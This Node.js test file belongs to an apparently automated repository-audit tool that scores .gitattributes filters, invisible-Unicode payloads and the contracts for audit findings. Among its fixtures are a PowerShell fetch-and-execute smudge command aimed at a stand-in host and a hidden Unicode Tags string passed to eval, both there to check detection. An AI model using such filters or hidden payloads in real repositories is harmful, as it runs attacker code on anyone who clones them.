import { test } from "node:test";
import assert from "node:assert/strict";

import {
    mapOverallVerdict,
    scoreGitAttributesFilter,
    scoreInvisibleUnicode,
    validateFindingContract,
} from "../packet.mjs";
import { ROLES, renderRolePrompt } from "../council/index.mjs";

const SHA = "1".repeat(40);

test("verdict preserves the highest credible severity, including one high", () => {
    assert.equal(mapOverallVerdict([{ severity: "high" }]), "high");
    assert.equal(mapOverallVerdict([
        { severity: "low" },
        { severity: "critical" },
    ]), "critical");
    assert.equal(mapOverallVerdict([{ severity: "medium" }]), "medium");
});

test("incomplete acquisition or council coverage overrides trusted verdicts", () => {
    const findings = [{ severity: "critical" }];
    assert.equal(
        mapOverallVerdict(findings, { mandatoryAcquisitionComplete: false }),
        "incomplete",
    );
    assert.equal(
        mapOverallVerdict(findings, { councilCoverageComplete: false }),
        "incomplete",
    );
});

test("standard Git LFS attributes are benign", () => {
    assert.deepEqual(
        scoreGitAttributesFilter({
            attributesLine: "*.psd filter=lfs diff=lfs merge=lfs -text",
            cleanCommand: "git-lfs clean -- %f",
            smudgeCommand: "git-lfs smudge -- %f",
            processCommand: "git-lfs filter-process",
        }),
        {
            finding: false,
            severity: null,
            classification: "standard-git-lfs",
            confidence: "high",
        },
    );
});

test("custom fetch-and-execute filters escalate from their execution behavior", () => {
    const scored = scoreGitAttributesFilter({
        attributesLine: "*.js filter=hydrate",
        smudgeCommand: "powershell -c \"iwr https://example.invalid/p | iex\"",
    });
    assert.equal(scored.finding, true);
    assert.equal(scored.severity, "critical");
});

test("BOM at start and isolated emoji variation selector are benign", () => {
    const source = String.fromCodePoint(0xFEFF)
        + `const icon = "${String.fromCodePoint(0x2764, 0xFE0F)}";`;
    assert.equal(scoreInvisibleUnicode(source).finding, false);
});

test("payload-shaped Tags runs in source escalate to critical", () => {
    const tagPayload = String.fromCodePoint(0xE0061).repeat(12);
    const scored = scoreInvisibleUnicode(`const hidden = "${tagPayload}"; eval(hidden);`, {
        filePath: "src/index.js",
    });
    assert.equal(scored.finding, true);
    assert.equal(scored.severity, "critical");
    assert.equal(scored.payloadShaped, true);
    assert.equal(scored.counts.tags, 12);
});

test("finding contract rejects missing confidence", () => {
    const result = validateFindingContract({
        severity: "high",
        exploit_prerequisites: "User installs the package.",
        benign_context_explanation: "None plausible.",
        verification_step: "Inspect the referenced install script without executing it.",
        cross_validation_count: 1,
    }, { councilDerived: true });
    assert.equal(result.valid, false);
    assert.ok(result.missingFields.includes("confidence"));
});

test("role output contract requires fidelity fields and parse-fails omissions", () => {
    const role = ROLES.find((candidate) => candidate.id === "install-build-hook");
    const prompt = renderRolePrompt(role, {
        auditId: "11111111-1111-4111-8111-111111111111",
        clonePath: "C:\\audit\\octocat-demo-1111111",
        buildRoot: "C:\\audit",
        owner: "octocat",
        repo: "demo",
        sourceCommitSha: SHA,
        nonce: "verdict-fidelity",
        coverageSnapshot: { coverageComplete: true, aggregateEntryCount: 1 },
        candidatePaths: ["package.json"],
    });
    assert.match(prompt, /strongestBenignHypothesis/);
    assert.match(prompt, /maliciousProjectFit/);
    assert.match(prompt, /behaviorSignature/);
    assert.match(prompt, /excerptHash/);
    assert.match(prompt, /non-conforming output triggers a parse-failure retry/i);
});
